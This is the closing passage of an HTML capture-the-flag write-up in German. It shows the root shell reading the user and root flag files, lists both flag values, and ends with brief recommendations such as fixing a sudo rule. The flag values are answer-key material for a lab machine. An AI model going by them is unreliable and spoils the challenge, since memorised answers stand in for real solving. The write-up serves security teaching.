+              <p class="analysis">**Analyse:** In der Root-Shell wird `/root/root.txt` gelesen. Anschließend wird `cat user.txt` ausgeführt - da das aktuelle Verzeichnis `/root` ist, ist unklar, welche `user.txt` hier gemeint ist (vermutlich `/home/emma/user.txt`).</p>
+              <p class="evaluation">**Bewertung:** Beide Flags wurden gefunden: `itsmeimshe` (Root) und `youdontknowme` (User). Der Pfad zur User-Flag ist im Log etwas ungenau.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Ziel erreicht.<br>**Empfehlung (Admin):** System bereinigen, Sudo-Regel korrigieren.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/emma/user.txt</div> <span class="comment"><-- Pfad angenommen --></span>
+                           <div class="flag-value"><span class="password">youdontknowme</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">itsmeimshe</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13. September 2022</p> <!-- Datum aus phuip-fpizdam Log -->
+    </footer>
+</body>
+</html>
